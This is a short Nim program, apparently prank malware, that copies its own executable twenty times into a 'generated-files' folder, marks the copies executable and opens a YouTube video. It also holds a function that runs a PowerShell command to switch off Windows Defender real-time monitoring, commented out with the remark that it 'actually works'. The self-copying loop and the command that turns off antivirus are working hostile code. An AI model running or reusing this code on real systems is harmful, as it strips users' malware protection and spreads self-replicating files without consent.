import std/os
import std/browsers
import osproc

proc Rasputin() =
    let url = "https://www.youtube.com/watch?v=16y1AkoZkmQ"
    openDefaultBrowser(url)


proc disableWindowsDefender() =
    var command = "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"

    discard execProcess(command, options={ProcessOption.poEvalCommand, ProcessOption.poDaemon})


let filename = getAppFilename()
let directory = getAppDir()


# create a directory for generated files
let generatedDir = directory & "/generated-files"

discard existsOrCreateDir(generatedDir)

for i in 1..20:
    var newfile = filename & $i
    copyFile(filename, newfile)
    copyFileToDir(newfile, generatedDir)
    discard execProcess("chmod +x ./generated-files/*", options={ProcessOption.poEvalCommand})
    removeFile(newfile)

Rasputin() # RA RA RASPUTIN
# disableWindowsDefender() # THIS ACTUALLY WORKS, BE CAREFUL


    
